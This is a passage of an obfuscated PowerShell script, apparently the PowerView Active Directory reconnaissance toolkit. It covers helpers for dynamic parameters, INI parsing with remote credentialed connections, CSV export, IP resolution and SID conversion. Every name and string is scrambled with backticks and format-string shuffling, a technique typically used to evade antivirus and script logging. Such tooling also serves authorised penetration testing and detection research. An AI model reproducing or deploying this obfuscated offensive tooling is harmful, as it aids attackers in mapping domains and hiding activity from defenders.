    ${iLgEneRa`TO`R2}.("{1}{0}" -f'it','Em').Invoke(  ( ls  ('va'+'r'+'i'+'a'+'blE:Ge5s')  )."V`ALue"::"cA`lL",
         ( gEt-VariABLe ("{0}{1}"-f'cU','y')  -vaLU).("{1}{2}{0}" -f 'od','GetMet','h').Invoke(("{3}{0}{2}{1}"-f 'om','andle','H','GetTypeFr')))
    ${I`lGeN`Er`AtO`R2}.("{1}{0}"-f'mit','E').Invoke( ${g`E5s}::"ca`LL",
         (GeT-VAriaBle  ("{0}{1}"-f'v','pZS') -vaLueONl ).("{0}{2}{1}" -f'GetMet','od','h').Invoke(("{0}{3}{2}{4}{1}" -f 'P','e','rTo','t','Structur'), [Type[]] @([IntPtr], [Type])))
    ${ILgENE`R`A`TOR2}.("{1}{0}"-f 'it','Em').Invoke( (VARIABLE  ("GE5"+"S") -vAlue )::"u`Nb`ox`_ANy", ${ST`Ru`ctbu`IlD`er})
    ${il`gEN`E`RA`ToR2}.("{1}{0}"-f 'it','Em').Invoke( (gEt-iTeM  ("{2}{0}{3}{1}"-f'bLE:Ge','S','vaRIa','5')  )."vAl`Ue"::"R`Et")

    ${st`Ruc`TBUILd`eR}.("{2}{1}{0}" -f'eateType','r','C').Invoke()
}








Function NEW-DY`NAMicpaRa`m`e`TeR {


    [CmdletBinding(dEFAulTPArAMETeRsETNAMe = {"{3}{2}{0}{1}" -f'ame','ter','amicPar','Dyn'})]
    Param (
        [Parameter(mANdAToRy = ${tR`Ue}, VAlUEfRoMpipelInE = ${tR`UE}, valuefrOmpIpElInEBypROPErtynamE = ${T`RuE}, PARamETeRsETNAme = "DYNamicP`ArAMET`Er")]
        [ValidateNotNullOrEmpty()]
        [string]${NA`ME},

        [Parameter(vAlUeFROmpipElInebYPrOPerTYnAME = ${t`RUe}, PaRameTeRsetName = "dYn`AmI`Cp`ARAME`TeR")]
        [System.Type]${T`ypE} = [int],

        [Parameter(vaLUEFROmPiPeLINebYprOPertYnAME = ${T`RUE}, pARaMeterSetnAME = "DY`Na`miCpArAm`EtER")]
        [string[]]${ALI`AS},

        [Parameter(vAlUEFrOMpiPElINEbYproPeRtynamE = ${T`RUe}, PAraMETErSetNamE = "DynA`MIcp`ARaME`TER")]
        [switch]${M`AN`dA`TorY},

        [Parameter(vaLUefroMpIPElINEbYpropERtyname = ${TR`Ue}, PAraMeTErSETnAMe = "DYN`Am`iCP`Arame`TER")]
        [int]${P`OsitI`on},

        [Parameter(valuefromPIpeLINebYPRopertyNaMe = ${tr`UE}, PARAMetErSetNaMe = "D`Yn`A`mIcpArAmeTER")]
        [string]${he`lpMeS`SagE},

        [Parameter(VaLuEfrOMpiPELiNebyPROPERtyName = ${TR`UE}, paraMEtersETName = "DYnamI`cp`ARaM`Et`ER")]
        [switch]${dO`NTs`HoW},

        [Parameter(vAlUEFrOmPIpeLInEBYprOPErTYNAmE = ${T`Rue}, PARAMEteRsETNAME = "D`yNA`MiCpAramETER")]
        [switch]${V`AlUeFRoM`p`ip`ElIne},

        [Parameter(vAlUEFROmpiPELiNEbyPrOPeRtYnaMe = ${T`RUe}, paRametERsetname = "Dyn`A`mIc`PArAM`eTer")]
        [switch]${vAl`UE`FRoMpiPe`lIN`Eby`PROP`eRT`Y`N`AmE},

        [Parameter(vaLUEFRoMPiPeliNEByPRoPertynAmE = ${TR`Ue}, PARamEtErsetNAme = "DYNa`mi`cp`ARaMEteR")]
        [switch]${VALue`FrOMR`emAIni`NGAr`GU`m`eNtS},

        [Parameter(vaLuefroMpiPElinEbYPropERTyNAME = ${TR`UE}, paRametERseTNaME = "dyNaM`icpa`R`AmeTer")]
        [string]${Par`A`m`etERsetN`A`me} = "_`_ALL`parame`TeRSeTs",

        [Parameter(VaLueFRoMpIPELInEBYProPeRTynAME = ${TR`UE}, PARaMEterSETNAme = "dy`NAMI`cpARAme`T`er")]
        [switch]${aLLoW`NU`ll},

        [Parameter(VALueFrOmpiPELINEBYpRopErtynaME = ${T`Rue}, PARAMeterSeTname = "dyNAmi`CPa`RA`ME`TEr")]
        [switch]${ALLOW`EM`ptySt`Ring},

        [Parameter(VALUEfROmPiPelIneBYPrOPeRTynAme = ${t`RuE}, pArAmEterSEtnAme = "d`YnAmICp`A`RAm`eter")]
        [switch]${A`llOwemp`TYc`olLEC`T`Ion},

        [Parameter(VaLueFRomPiPELinEBYPRopeRTYNaMe = ${tR`UE}, PAraMeTerseTnAMe = "d`YnAMICPAr`Ame`Ter")]
        [switch]${val`IDat`e`No`TnuLl},

        [Parameter(VAlUefromPiPelineByProPErTynAme = ${tR`Ue}, parAmEtErSeTname = "dynAmIC`PA`R`A`meTER")]
        [switch]${v`Ali`daTEnOt`NUllor`EMp`Ty},

        [Parameter(VAluefrOmPiPeLINeByPropeRTynaME = ${TR`Ue}, PaRAMeTeRSeTName = "d`yNAm`ICP`AR`AMetER")]
        [ValidateCount(2,2)]
        [int[]]${VaLiDAt`e`COu`NT},

        [Parameter(VAluefrOMPipElInebyprOPERTynamE = ${T`Rue}, PaRaMeTersETNAme = "dY`Na`mICParAMet`eR")]
        [ValidateCount(2,2)]
        [int[]]${V`Alid`ATe`RaNGE},

        [Parameter(vALuefrompipeLiNEBYPrOPERtYNAMe = ${tr`UE}, PAramEteRsEtnAME = "d`YNAM`IcpArAmEter")]
        [ValidateCount(2,2)]
        [int[]]${VAl`iDA`TEl`eN`gTh},

        [Parameter(vaLueFROMPipeLInEbyProPertYnamE = ${Tr`Ue}, paRAMETerSetNaMe = "DYNam`ic`P`A`RamEtEr")]
        [ValidateNotNullOrEmpty()]
        [string]${va`LiD`ATep`AtTErN},

        [Parameter(ValuEfROmPipElinEbyPrOpERtYNAme = ${t`RuE}, pARameTeRsetnAME = "dYN`AMICPar`Ame`Ter")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${val`Ida`T`EScr`ipT},

        [Parameter(vaLuEfrOMpipElINEByPROpeRTynAme = ${TR`Ue}, pARAmetersetNaME = "dynAmi`CP`ARAME`Ter")]
        [ValidateNotNullOrEmpty()]
        [string[]]${vAl`ida`TE`SeT},

        [Parameter(valUefrOMpiPelInEByPROPErtynaME = ${T`RUe}, PARametersetname = "dyNaMicp`ARA`m`e`TER")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{8}{16}{1}{4}{3}{6}{11}{0}{14}{15}{7}{2}{17}{12}{10}{9}{13}{5}" -f'anag','must ','ime','a','be ','ject',' Sys','Runt','Dictio','eterDictio','edParam','tem.M','n','nary ob','emen','t.Automation.','nary ','Defi')
            }
            ${T`RUe}
        })]
        ${di`c`Ti`oNarY} = ${FAL`SE},

        [Parameter(mANdatoRy = ${TR`Ue}, ValueFRomPIPElineBYPROpErTYNAmE = ${t`Rue}, PARAMetERsETNAme = "CreATEv`AR`Ia`BLes")]
        [switch]${cr`EATe`VAriab`L`ES},

        [Parameter(MaNDATorY = ${tR`Ue}, VAlueFRoMpIPelInEbyPRoPErtyNAME = ${TR`UE}, ParamEtErseTnamE = "C`REa`TeVA`RIaBlES")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.("{2}{0}{1}"-f 'p','e','GetTy').Invoke()."NA`me" -notmatch ("{0}{2}{1}" -f'D','y','ictionar')) {
                Throw ("{8}{16}{21}{20}{0}{14}{3}{1}{17}{19}{6}{4}{7}{9}{18}{11}{23}{12}{10}{24}{22}{5}{2}{13}{15}" -f'st be a','s','ctionary obj','y','t.Au','Di','n','to','B','mati','a','P','BoundP','ec',' S','t','oundPara','tem.Managem','on.','e','eters mu','m','ameters','S','r')
            }
            ${tR`Ue}
        })]
        ${BO`UnDPAR`AmE`TErs}
    )

    Begin {
        ${i`NT`erNAL`dICti`oNaRy} = &("{2}{0}{1}" -f 'b','ject','New-O') -TypeName ("{0}{7}{6}{13}{1}{12}{8}{4}{10}{3}{2}{5}{11}{9}"-f'S','mati','ef','D','im','in','m.Manage','yste','.Runt','eterDictionary','e','edParam','on','ment.Auto')
        function _`TEmp { [CmdletBinding()] Param() }
        ${CO`MMon`pA`R`AmEt`erS} = (&("{2}{3}{0}{1}" -f 'n','d','Ge','t-Comma') ("{0}{1}" -f'_tem','p'))."paRa`MEt`ERs"."Ke`YS"
    }

    Process {
        if(${CRE`A`TEvarI`ABleS}) {
            ${b`O`U`NDKEYs} = ${BO`UNdPArA`met`ERS}."K`EYS" | &("{2}{0}{1}"-f 're-Ob','ject','Whe') { ${cOmM`oNPar`A`ME`Te`Rs} -notcontains ${_} }
            ForEach(${P`ArAM`EtER} in ${BOuN`DK`eYS}) {
                if (${PAra`M`eter}) {
                    &("{3}{2}{1}{0}"-f 'ble','ria','et-Va','S') -Name ${PArA`M`eT`Er} -Value ${b`oUnD`Par`A`mEteRs}.${paramE`T`eR} -Scope 1 -Force
                }
            }
        }
        else {
            ${sTa`lek`Eys} = @()
            ${StAl`Ek`EYs} = ${psboundpar`AME`T`eRS}.("{3}{1}{2}{0}"-f 'rator','tEn','ume','Ge').Invoke() |
                        &("{1}{4}{2}{3}{0}"-f'ject','Fo','h-','Ob','rEac') {
                            if(${_}."VaL`Ue"."P`SOB`JecT"."ME`TH`odS"."n`AMe" -match ((('^Equals'+'B0'+'j') -repLAcE 'B0j',[CHAR]36))) {
                                
                                if(!${_}."vaL`Ue".("{1}{0}" -f'ls','Equa').Invoke((&("{1}{0}{2}" -f 't-Variabl','Ge','e') -Name ${_}."K`ey" -ValueOnly -Scope 0))) {
                                    ${_}."K`ey"
                                }
                            }
                            else {
                                
                                if(${_}."Va`Lue" -ne (&("{1}{0}{2}{3}"-f 'et','G','-Va','riable') -Name ${_}."k`ey" -ValueOnly -Scope 0)) {
                                    ${_}."K`EY"
                                }
                            }
                        }
            if(${st`Al`e`kEYs}) {
                ${St`ALEkE`ys} | &("{3}{0}{1}{2}"-f'h-','O','bject','ForEac') {[void]${psBoUND`P`A`Ra`Me`TErS}.("{0}{1}"-f 'Rem','ove').Invoke(${_})}
            }

            
            ${uNBoUn`DP`ARa`M`ET`eRS} = (&("{2}{0}{1}"-f 't-C','ommand','Ge') -Name (${pSc`mDl`ET}."myInVo`C`ATIon"."i`NVOcA`T`iOnNAme"))."pA`Ra`metErS".("{3}{2}{1}{0}" -f'tor','era','tEnum','Ge').Invoke()  |
                                        
                                        &("{2}{1}{3}{0}"-f 'ct','-Ob','Where','je') { ${_}."V`ALUE"."pAramET`e`Rse`TS"."Ke`yS" -contains ${PS`cM`dLET}.PARameTeRsETname } |
                                            &("{2}{0}{1}"-f'elec','t-Object','S') -ExpandProperty ("{0}{1}" -f 'Ke','y') |
                                                
                                                &("{3}{1}{2}{0}" -f'e-Object','he','r','W') { ${Psb`O`U`ND`paRamEterS}."K`eys" -notcontains ${_} }

            
            ${t`Mp} = ${N`Ull}
            ForEach (${p`AR`AmETEr} in ${uNBO`UN`Dp`ARAMe`Ters}) {
                ${dE`FA`UL`TvaLuE} = &("{2}{1}{0}" -f'e','t-Variabl','Ge') -Name ${P`ARam`etEr} -ValueOnly -Scope 0
                if(!${psBOu`N`d`pARametE`Rs}."T`Ry`GeTvalUE"(${PAR`AM`eTER}, [ref]${t`Mp}) -and ${DefA`ULT`V`Al`Ue}) {
                    ${PS`Bou`NdP`A`R`AmeTERS}.${PA`Rame`Ter} = ${D`e`FAulTvAlue}
                }
            }

            if(${DiCTi`o`NA`Ry}) {
                ${D`pd`iCTI`Onary} = ${dIctIo`Na`RY}
            }
            else {
                ${DpD`icT`i`O`NArY} = ${iN`TerNa`Ldi`CTiON`Ary}
            }

            
            ${G`etVAr} = {&("{2}{0}{3}{1}" -f'et-Va','le','G','riab') -Name ${_} -ValueOnly -Scope 0}

            
            ${aTtr`IbUTE`R`EgEx} = (('^(Mandat'+'ory'+'{1}P'+'o'+'s'+'ition{'+'1}P'+'ara'+'mete'+'rSetN'+'ame{1}'+'DontShow'+'{1'+'}Hel'+'pM'+'es'+'sage{1}Value'+'Fr'+'o'+'m'+'Pipelin'+'e'+'{1}'+'ValueF'+'romPi'+'pelin'+'eByP'+'rope'+'rtyNam'+'e{1}V'+'a'+'lueFromRe'+'mainingAr'+'gumen'+'ts'+')'+'{0'+'}')  -F[chaR]36,[chaR]124)
            ${vALiDA`TI`Onr`E`Gex} = ((('^(Al'+'lowNull'+'N5'+'JAll'+'ow'+'Em'+'ptySt'+'r'+'in'+'gN5JAllowEmptyCollection'+'N5JVa'+'li'+'d'+'ate'+'CountN5J'+'Val'+'idateLengthN5J'+'V'+'a'+'lid'+'a'+'tePa'+'tte'+'rn'+'N5JValidate'+'Ra'+'ngeN'+'5'+'JVali'+'d'+'ateScrip'+'tN5JValidateSet'+'N5'+'JValidateNotNull'+'N5JVali'+'dat'+'eNotNullOrEmpty'+')9'+'SA') -rePLACe 'N5J',[chAR]124-rePLACe ([chAR]57+[chAR]83+[chAR]65),[chAR]36))
            ${A`liaS`ReG`ex} = {('^Al'+'ia'+'s7iV')."rePl`AcE"('7iV',[sTRInG][chaR]36)}
            ${PaRA`M`Et`ERaTt`R`iBute} = &("{2}{1}{0}" -f 'ject','ew-Ob','N') -TypeName ("{5}{4}{11}{7}{14}{3}{2}{0}{13}{8}{12}{9}{6}{10}{1}"-f'ati','ttribute','tom','.Au','tem.','Sys','ter','anagemen','a','me','A','M','ra','on.P','t')

            switch -regex (${p`SBo`Undp`ARaME`T`eRs}."K`eYS") {
                ${At`TrIbU`TER`EgEX} {
                    Try {
                        ${par`AmEt`e`R`A`TTrIbU`Te}.${_} = . ${GeTV`AR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${DPDI`cT`ioNaRy}."ke`YS" -contains ${N`Ame}) {
                ${dPdi`c`TiOnaRy}.${na`mE}."aTTRIB`U`TES".("{1}{0}" -f 'd','Ad').Invoke(${P`Ara`M`EterATTrIbuTE})
            }
            else {
                ${Attri`BUte`C`oLleCTioN} = &("{1}{3}{2}{0}"-f'ect','New-','j','Ob') -TypeName ("{7}{4}{5}{1}{2}{0}{3}{8}{6}" -f'ystem.Att','l.Collection[','S','ri','ollections.ObjectM','ode','e]','C','but')
                switch -regex (${p`sBo`Un`DparAMe`T`Ers}."k`eYs") {
                    ${valI`da`Tion`RE`GeX} {
                        Try {
                            ${pA`RaMeT`erOPt`Io`NS} = &("{1}{2}{3}{0}"-f 't','New','-O','bjec') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${GETv`AR}) -ErrorAction ("{1}{0}" -f'p','Sto')
                            ${AT`TRIBuTEcO`L`L`eCtI`oN}.("{0}{1}"-f'A','dd').Invoke(${Pa`RaME`TeRoP`Tions})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${a`l`iASREGEx} {
                        Try {
                            ${Pa`RaME`TEr`ALias} = &("{2}{0}{3}{1}"-f'-Ob','ct','New','je') -TypeName ("{8}{3}{0}{1}{5}{9}{6}{4}{2}{12}{7}{11}{10}"-f 'ge','m','n.Alia','na','io','e','tomat','At','System.Ma','nt.Au','te','tribu','s') -ArgumentList (. ${g`eTvar}) -ErrorAction ("{0}{1}"-f'Sto','p')
                            ${attRIbu`TEcO`LLe`Ct`i`On}.("{0}{1}"-f'Ad','d').Invoke(${pArAMe`T`ERaL`IAs})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${aT`Tr`iButEcollE`CTiOn}.("{1}{0}" -f'd','Ad').Invoke(${PaRam`ETerAT`Tri`Bute})
                ${Pa`Rame`Ter} = &("{0}{2}{1}"-f'New-','ject','Ob') -TypeName ("{7}{3}{11}{5}{0}{12}{4}{1}{6}{8}{9}{2}{10}" -f 'ment','.','DefinedParam','ste','n','ge','R','Sy','unt','ime','eter','m.Mana','.Automatio') -ArgumentList @(${n`AME}, ${ty`Pe}, ${a`TTRIB`U`TE`COL`LEcTI`On})
                ${DPd`ICtI`onarY}.("{1}{0}"-f 'd','Ad').Invoke(${na`ME}, ${par`A`me`TeR})
            }
        }
    }

    End {
        if(!${C`REAt`EvARiabL`Es} -and !${Di`CTIo`NarY}) {
            ${dpDi`CTI`OnARy}
        }
    }
}


function GET-IN`I`c`onTEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{1}{2}"-f 'oul','dProces','s','P','SSh'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitioN = 0, MANdAToRY = ${T`RUe}, ValueFRompIPelINE = ${tR`UE}, VALueFRomPIPELIneBYpRopeRtYNAMe = ${tR`UE})]
        [Alias({"{2}{0}{1}"-f'lNa','me','Ful'}, {"{0}{1}" -f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pA`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRedE`N`TI`AL} =   (vAriABlE  ("{1}{0}"-f 'q02','7T') )."V`AlUe"::"Em`pTY",

        [Switch]
        ${OU`TpuTO`Bje`CT}
    )

    BEGIN {
        ${Map`P`e`DCoMp`UTeRs} = @{}
    }

    PROCESS {
        ForEach (${ta`Rg`EtPatH} in ${pA`TH}) {
            if ((${TaRg`et`PATh} -Match ((("{5}{0}{6}{3}{4}{2}{1}"-f '0}','{0}.*','0}','0}.*','{','{0}{0}{','{')) -F[cHAR]92)) -and (${PsBoUnD`P`AR`AMeters}[("{0}{2}{1}"-f'Cr','ntial','ede')])) {
                ${hO`s`TCoMpU`Ter} = (&("{2}{1}{0}" -f 'w-Object','e','N') ("{0}{3}{2}{1}" -f 'Syste','i','Ur','m.')(${T`A`RgeTPa`Th}))."hO`ST"
                if (-not ${map`peDC`OM`p`UTeRS}[${hOS`T`COMP`UTeR}]) {
                    
                    &("{0}{4}{1}{3}{2}"-f'A','d-Re','n','moteConnectio','d') -ComputerName ${HOStCOm`pu`T`Er} -Credential ${cR`eD`en`TIAl}
                    ${mAPPE`Dco`Mp`UT`eRs}[${hostcomPU`T`er}] = ${tR`Ue}
                }
            }

            if (&("{2}{0}{1}"-f 'st-Pa','th','Te') -Path ${T`ArGE`T`pAtH}) {
                if (${P`S`Bound`pAR`Am`etErs}[("{1}{0}{2}"-f 'Obj','Output','ect')]) {
                    ${inioBj`E`Ct} = &("{2}{1}{0}"-f 'bject','ew-O','N') ("{2}{0}{1}" -f 'bje','ct','PSO')
                }
                else {
                    ${InIo`B`jECt} = @{}
                }
                Switch -Regex -File ${t`ARg`eTpath} {
                    ((("{2}{0}{1}{3}"-f'}[(','.+){0','^{0','}]')) -f[ChaR]92) 
                    {
                        ${SE`ctI`ON} = ${maT`cH`es}[1].("{0}{1}"-f 'T','rim').Invoke()
                        if (${P`SB`Ound`Pa`R`AmeTeRS}[("{3}{1}{0}{2}" -f 'O','t','bject','Outpu')]) {
                            ${s`eCtI`oN} = ${Se`CtiOn}.("{1}{2}{0}"-f 'ace','Rep','l').Invoke(' ', '')
                            ${sE`C`Ti`OnO`BJEcT} = &("{2}{0}{1}"-f '-Obj','ect','New') ("{1}{0}{2}" -f 'Ob','PS','ject')
                            ${I`Ni`O`BJEct} | &("{1}{2}{0}" -f'er','A','dd-Memb') ("{3}{1}{2}{0}"-f'y','otep','ropert','N') ${SE`ct`iOn} ${Se`cTi`o`Nobje`CT}
                        }
                        else {
                            ${I`NioBJ`ECt}[${SECt`i`oN}] = @{}
                        }
                        ${COM`mENT`count} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${v`Al`UE} = ${mA`TCh`es}[1].("{1}{0}" -f'rim','T').Invoke()
                        ${COmMEn`Tc`OunT} = ${CO`Mment`cOu`Nt} + 1
                        ${NA`ME} = ("{0}{1}"-f'Co','mment') + ${COM`M`enTcOU`Nt}
                        if (${Ps`B`OunDP`A`RAmetERs}[("{2}{1}{0}"-f'ject','utOb','Outp')]) {
                            ${na`Me} = ${N`AMe}.("{2}{0}{1}" -f 'ac','e','Repl').Invoke(' ', '')
                            ${In`iob`jEcT}.${SE`c`TIon} | &("{1}{0}{2}" -f 'dd-Mem','A','ber') ("{1}{3}{0}{2}" -f'oper','Not','ty','epr') ${NA`me} ${v`A`lUe}
                        }
                        else {
                            ${iN`ioBJ`ecT}[${sE`ctI`on}][${nA`ME}] = ${VA`Lue}
                        }
                    }
                    ((("{1}{0}{2}{3}"-f'}s*=(','(.+?){0','.*',')'))  -F  [chAr]92) 
                    {
                        ${na`Me}, ${va`l`Ue} = ${Mat`c`hes}[1..2]
                        ${N`AmE} = ${Na`me}.("{0}{1}" -f 'T','rim').Invoke()
                        ${V`AL`UES} = ${VA`LUe}.("{1}{0}"-f'it','spl').Invoke(',') | &("{2}{1}{3}{4}{0}"-f't','c','ForEa','h-Ob','jec') { ${_}.("{1}{0}"-f 'm','Tri').Invoke() }

                        

                        if (${p`sBo`U`NdP`ARAmETeRS}[("{2}{1}{0}"-f 'ect','bj','OutputO')]) {
                            ${N`Ame} = ${n`AMe}.("{0}{1}" -f'R','eplace').Invoke(' ', '')
                            ${i`NIOBJ`ECT}.${Se`cTI`ON} | &("{2}{0}{1}" -f 'Me','mber','Add-') ("{1}{2}{0}{3}" -f'eprope','No','t','rty') ${na`Me} ${V`A`lUEs}
                        }
                        else {
                            ${I`NiOB`JECt}[${s`e`cTIon}][${nA`me}] = ${va`l`UeS}
                        }
                    }
                }
                ${i`N`iobjeCt}
            }
        }
    }

    END {
        
        ${M`A`PPEdCOmPUtE`RS}."k`eYS" | &("{3}{5}{0}{2}{4}{1}"-f've-Remote','nection','Co','R','n','emo')
    }
}


function EXporT`-PO`W`ErVIEWcsV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{0}{2}"-f 'ce','uldP','ss','PSSho','ro'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(MAnDATOry = ${tr`Ue}, VALuEfRoMpIpEline = ${t`Rue}, vALuEfROMpiPElInebyPRopErTYnAME = ${T`Rue})]
        [System.Management.Automation.PSObject[]]
        ${I`NPU`TO`BJEcT},

        [Parameter(MAndaTOry = ${t`RuE}, poSitioN = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${P`ATh},

        [Parameter(PosITion = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${dE`l`ImiTeR} = ',',

        [Switch]
        ${appE`ND}
    )

    BEGIN {
        ${O`U`TPU`TPath} =  ( gI  ("{1}{4}{2}{0}{3}"-f':sj3','var','le','X0o','iab'))."V`ALue"::"gEtFu`l`LP`Ath"(${P`sBOu`Ndp`ARAMET`ERS}[("{0}{1}"-f'Pat','h')])
        ${eXi`sTS} =   ${h`9e}::("{1}{0}" -f'ts','Exis').Invoke(${OUt`PU`TpAtH})

        
        ${M`U`Tex} = &("{1}{0}{2}" -f 'ew','N','-Object') ("{3}{0}{2}{4}{1}"-f'em.Th','Mutex','re','Syst','ading.') ${f`ALse},("{0}{1}"-f'CSVMute','x')
        ${N`UlL} = ${m`Utex}.("{1}{0}"-f'itOne','Wa').Invoke()

        if (${pSb`O`U`NDpa`R`AmEteRs}[("{0}{1}"-f 'Ap','pend')]) {
            ${F`i`Le`MoDE} =  ( GeT-vARIAble  ("t"+"PmOr"))."v`Alue"::"a`pPe`ND"
        }
        else {
            ${fI`LEMO`De} =   ${T`PMOr}::"cr`Ea`Te"
            ${E`xiSTS} = ${f`ALSe}
        }

        ${cs`V`sTREam} = &("{1}{0}{3}{2}"-f 'w-','Ne','bject','O') ("{2}{1}{3}{0}" -f'm','.Fil','IO','eStrea')(${ouTPU`TPa`TH}, ${Fil`eM`oDe},  ${m`V6}::"wR`iTE",  ${D51w`oI}::"RE`Ad")
        ${CSv`W`Riter} = &("{2}{0}{1}" -f 'Ob','ject','New-') ("{1}{0}{4}{5}{2}{3}" -f'm.IO','Syste','mWr','iter','.Stre','a')(${Cs`VS`TRE`Am})
        ${C`sVW`RiTeR}."A`UtO`FlUSh" = ${t`Rue}
    }

    PROCESS {
        ForEach (${EN`T`Ry} in ${Inp`Ut`Ob`JECT}) {
            ${OBjEc`TC`sV} = &("{0}{2}{3}{1}" -f'Con','v','vertT','o-Cs') -InputObject ${e`NTrY} -Delimiter ${dE`L`IMITer} -NoTypeInformation

            if (-not ${EXi`s`TS}) {
                
                ${obJ`eCt`CsV} | &("{2}{1}{0}"-f '-Object','rEach','Fo') { ${C`sVw`RiTEr}.("{1}{0}"-f 'eLine','Writ').Invoke(${_}) }
                ${eX`ISTs} = ${tR`UE}
            }
            else {
                
                ${ob`je`Ctcsv}[1..(${ObJ`e`CTcSV}."LeNg`TH"-1)] | &("{2}{3}{4}{0}{1}"-f 'je','ct','ForEac','h-O','b') { ${cSV`Wr`iteR}.("{0}{1}" -f'Write','Line').Invoke(${_}) }
            }
        }
    }

    END {
        ${Mu`TEx}.("{2}{1}{3}{0}"-f 'x','aseMu','Rele','te').Invoke()
        ${C`sv`WrI`Ter}.("{0}{1}"-f 'Di','spose').Invoke()
        ${cSVsTr`E`Am}.("{2}{1}{0}" -f'se','o','Disp').Invoke()
    }
}


function reSo`LVe-`I`PAddrEsS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f'SSho','P','dProcess','ul'}, '')]
    [OutputType({"{5}{1}{8}{6}{2}{3}{7}{4}{9}{0}"-f 'ct','y','.Managem','en','.Au','S','m','t','ste','tomation.PSCustomObje'})]
    [CmdletBinding()]
    Param(
        [Parameter(positioN = 0, vALUeFrOmpIpELiNE = ${T`Rue}, VAlUEFrOmPipElINEBYPRoPeRtyNAmE = ${T`RUe})]
        [Alias({"{1}{0}{2}" -f'tN','Hos','ame'}, {"{3}{2}{0}{1}"-f 'a','me','stn','dnsho'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`OMp`UTeR`NAMe} = ${En`V:cO`mpu`TErNAMe}
    )

    PROCESS {
        ForEach (${C`o`M`pUTeR} in ${c`O`mP`UteRN`AMe}) {
            try {
                @(( (geT-VAriablE ('kfa'+'d9') )."V`ALue"::("{2}{3}{1}{0}"-f'ry','ostEnt','Get','H').Invoke(${coMpU`T`ER}))."ADDrES`S`Li`sT") | &("{1}{2}{3}{0}" -f 'ct','For','Each-','Obje') {
                    if (${_}."Ad`D`ReSSFami`ly" -eq ("{3}{1}{0}{2}" -f'Net','nter','work','I')) {
                        ${O`UT} = &("{0}{2}{1}{3}"-f'N','-Obj','ew','ect') ("{1}{0}" -f 't','PSObjec')
                        ${o`UT} | &("{2}{3}{1}{0}"-f 'ber','em','Ad','d-M') ("{3}{0}{1}{2}"-f'r','o','perty','Notep') ("{3}{2}{0}{1}"-f'a','me','uterN','Comp') ${CO`MPuT`Er}
                        ${O`UT} | &("{0}{2}{1}" -f'A','d-Member','d') ("{2}{0}{1}{3}" -f 'otepro','pert','N','y') ("{2}{3}{0}{1}" -f 'e','ss','IPAd','dr') ${_}."ip`ADdre`ssToSt`RinG"
                        ${o`Ut}
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f'e','Write-Ver','bos') ('[Re'+'s'+'olve-IPAddress'+']'+' '+'C'+'ould '+'not'+' '+'re'+'solve'+' '+"$Computer "+'to'+' '+'an'+' '+'I'+'P '+'A'+'ddres'+'s.')
            }
        }
    }
}


function COnvERt`TO-s`id {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f 'PSS','ho','ldProcess','u'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(maNDaTOry = ${t`RUe}, vAlUefroMPIpEliNe = ${TR`UE}, vaLUEfroMPiPelInEbypRoPerTynAME = ${t`RUe})]
        [Alias({"{1}{0}"-f 'ame','N'}, {"{1}{2}{0}" -f'ty','Id','enti'})]
        [String[]]
        ${oBJectN`A`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}{4}"-f'oma','o','D','inC','ntroller'})]
        [String]
        ${Se`Rver},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EDE`NtIAL} =  ( gEt-ChiLdiTEm  ('VarIa'+'BlE:'+'7'+'Tq0'+'2')  )."v`ALUe"::"e`mpTy"
    )

    BEGIN {
        ${doM`A`I`NS`eaRCHerarGUME`NtS} = @{}
        if (${PsBO`U`ND`PaRAmET`ers}[("{0}{1}{2}" -f 'Dom','a','in')]) { ${DOm`AinS`eaRCH`eRaRGU`M`E`NTS}[("{1}{2}{0}" -f'n','Dom','ai')] = ${d`oM`AIn} }
        if (${P`s`BOunDpa`RaM`Ete`Rs}[("{1}{0}"-f'ver','Ser')]) { ${DO`MaInS`e`ArChE`RAr`Gu`me`NTs}[("{0}{1}" -f 'Serv','er')] = ${Se`RvEr} }
        if (${PS`BOunDPa`Ra`mE`TERs}[("{1}{2}{0}{3}" -f'eden','C','r','tial')]) { ${dOMAiNse`ArcH`ERA`RGU`m`enTS}[("{0}{2}{1}"-f'Cre','tial','den')] = ${cr`edeN`TIAL} }
    }

    PROCESS {
        ForEach (${ob`JecT} in ${Ob`J`eCtName}) {
            ${O`Bje`ct} = ${o`Bj`ECt} -Replace '/','\'

            if (${PsbOUND`pa`RamE`Te`RS}[("{2}{0}{3}{1}"-f 'e','l','Cr','dentia')]) {
                ${dn} = &("{3}{1}{0}{2}"-f'rt-ADNam','e','e','Conv') -Identity ${OBj`eCT} -OutputType 'DN' @DomainSearcherArguments
                if (${dN}) {
                    ${U`SerdoMA`IN} = ${d`N}.("{2}{0}{1}" -f 't','ring','SubS').Invoke(${d`N}.("{0}{1}{2}" -f 'I','nd','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
